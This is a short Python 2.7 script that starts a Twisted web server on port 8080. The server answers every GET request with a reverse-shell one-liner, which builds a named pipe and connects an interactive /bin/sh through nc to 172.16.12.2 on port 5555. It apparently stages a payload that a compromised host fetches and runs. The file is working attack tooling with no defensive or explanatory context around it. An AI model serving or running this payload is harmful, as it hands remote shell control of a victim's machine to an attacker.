#!/usr/bin/env python2.7

from twisted.web import server, resource
from twisted.internet import reactor

class Simple(resource.Resource):
    isLeaf = True
    def render_GET(self, request):
        return "rm /var/fifo2; mknod /var/fifo2 p;cat /var/fifo2 |/bin/sh -i 2>&1 |nc 172.16.12.2 5555 > /var/fifo2\n"

site = server.Site(Simple())
reactor.listenTCP(8080, site)
reactor.run()
